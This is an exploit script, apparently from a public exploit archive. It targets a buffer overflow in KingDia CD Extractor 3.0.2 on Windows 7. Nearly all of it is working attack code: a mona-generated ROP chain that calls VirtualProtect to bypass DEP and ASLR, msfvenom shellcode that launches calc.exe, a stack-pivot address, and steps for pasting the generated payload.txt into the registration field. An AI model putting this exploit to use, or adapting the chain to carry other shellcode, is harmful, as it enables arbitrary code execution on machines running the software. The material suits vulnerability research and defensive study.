#!/usr/bin/env python2

# Exploit Title: KingDia CD Extractor 3.0.2 (DEP+ASLR)
# Date: 03/01/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A
# How to use: 
#  - create payload.txt
#  - copy/paste the content into "Register"->"Username" box
# 

import struct

def create_rop_chain():

  # rop chain generated with mona.py - www.corelan.be
  rop_gadgets = [
    # Filler
    0x90909090,
    0x90909090,
    0x90909090,

    #[---INFO:gadgets_to_set_esi:---]
    0x100185f9,  # POP EAX # RETN [SkinMagic.dll] 
    0x1003b268,  # ptr to &VirtualProtect() [IAT SkinMagic.dll]
    0x100369a1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [SkinMagic.dll] 
    0x601d108f,  # XCHG EAX,ESI # RETN [in_mad.dll] 

    #[---INFO:gadgets_to_set_ebp:---]
    0x10037c6b,  # POP EBP # RETN [SkinMagic.dll] 
    0x601c9d6b,  # & jmp esp [in_mad.dll]

    #[---INFO:gadgets_to_set_ebx:---]
    0x1002e641,  # POP EAX # RETN [SkinMagic.dll] 
    0xfffffdff,  # Value to negate, will become 0x00000201
    0x1001f629,  # NEG EAX # RETN [SkinMagic.dll] 
    0x601ccfd1,  # XCHG EAX,EBX # RETN [in_mad.dll]  

#--> here
    #[---INFO:gadgets_to_set_edx:---]
    0x10032f5c,  # POP EDX # RETN    ** [SkinMagic.dll] ** 
    0xffffffff,  # -1 -> edx
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN
    0x601cafc9,  # INC EDX # MOV EAX,EDX # RETN

    #[---INFO:gadgets_to_set_ecx:---]
    0x1002c110,  # POP ECX # RETN [SkinMagic.dll] 
    0x100445d9,  # &Writable location [SkinMagic.dll]
    
    #[---INFO:gadgets_to_set_edi:---]
    0x601c8a24,  # POP EDI # RETN [in_mad.dll] 
    0x10032982,  # RETN (ROP NOP) [SkinMagic.dll]
    
    #[---INFO:gadgets_to_set_eax:---]
    0x10033de6,  # POP EAX # RETN [SkinMagic.dll] 
    0x90909090,  # nop
   
    #[---INFO:pushad:---]
    0x601c88f8,  # PUSHAD # RETN [in_mad.dll] 
  ]
  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)






offset=256

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbe\xb0\xe7\xa7\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x33"
shellcode += b"\xc9\xb1\x31\x31\x72\x13\x83\xea\xfc\x03\x72\xbf\x05"
shellcode += b"\x52\x39\x57\x4b\x9d\xc2\xa7\x2c\x17\x27\x96\x6c\x43"
shellcode += b"\x23\x88\x5c\x07\x61\x24\x16\x45\x92\xbf\x5a\x42\x95"
shellcode += b"\x08\xd0\xb4\x98\x89\x49\x84\xbb\x09\x90\xd9\x1b\x30"
shellcode += b"\x5b\x2c\x5d\x75\x86\xdd\x0f\x2e\xcc\x70\xa0\x5b\x98"
shellcode += b"\x48\x4b\x17\x0c\xc9\xa8\xef\x2f\xf8\x7e\x64\x76\xda"
shellcode += b"\x81\xa9\x02\x53\x9a\xae\x2f\x2d\x11\x04\xdb\xac\xf3"
shellcode += b"\x55\x24\x02\x3a\x5a\xd7\x5a\x7a\x5c\x08\x29\x72\x9f"
shellcode += b"\xb5\x2a\x41\xe2\x61\xbe\x52\x44\xe1\x18\xbf\x75\x26"
shellcode += b"\xfe\x34\x79\x83\x74\x12\x9d\x12\x58\x28\x99\x9f\x5f"
shellcode += b"\xff\x28\xdb\x7b\xdb\x71\xbf\xe2\x7a\xdf\x6e\x1a\x9c"
shellcode += b"\x80\xcf\xbe\xd6\x2c\x1b\xb3\xb4\x3a\xda\x41\xc3\x08"
shellcode += b"\xdc\x59\xcc\x3c\xb5\x68\x47\xd3\xc2\x74\x82\x90\x3d"
shellcode += b"\x3f\x8f\xb0\xd5\xe6\x45\x81\xbb\x18\xb0\xc5\xc5\x9a"
shellcode += b"\x31\xb5\x31\x82\x33\xb0\x7e\x04\xaf\xc8\xef\xe1\xcf"
shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"

rop_chain = create_rop_chain()

add_esp = 0x1001ee2a #  {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN

buf = "A" * offset			#  location after the stack pivoting
buf += rop_chain			# execute ROP chain after stack pivoting
buf += "\x90" *10
buf+=shellcode

f = open("payload.txt", "w")
f.write(buf)
f.close()
